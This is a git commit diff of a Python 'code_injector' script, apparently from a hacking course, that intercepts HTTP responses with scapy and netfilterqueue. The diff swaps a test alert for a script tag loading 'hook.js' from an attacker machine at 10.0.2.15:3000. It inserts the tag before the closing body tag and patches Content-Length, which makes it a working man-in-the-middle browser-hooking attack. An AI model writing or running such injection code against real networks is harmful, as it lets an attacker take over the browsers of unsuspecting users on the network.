4d57b61e9b6dc6e709177ba7e6158829eb67f063
Joseph Asare <asare.joseph33@gmail.com>
2019-10-24 08:45:20 -0400

    code_injector project completed.

--- 8.code_injector/code_injector.py
+++ 8.code_injector/code_injector.py
@@ -11,6 +11,8 @@ def set_load(packet, load):
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
     return packet
+
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
@@ -21,8 +23,8 @@ def process_packet(packet):
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            #print(scapy_packet.show())
-            injection_code = "<script>alert('test');</script>"
+            # print(scapy_packet.show())
+            injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
             load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
 
@@ -31,15 +33,13 @@ def process_packet(packet):
                 new_content_length = int(content_length) + len(injection_code)
                 load = load.replace(content_length, str(new_content_length))
 
-        if load !=scapy_packet[scapy.Raw].load:
+        if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
             packet.set_payload(str(new_packet))
 
     packet.accept()
 
+
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
-
-
-
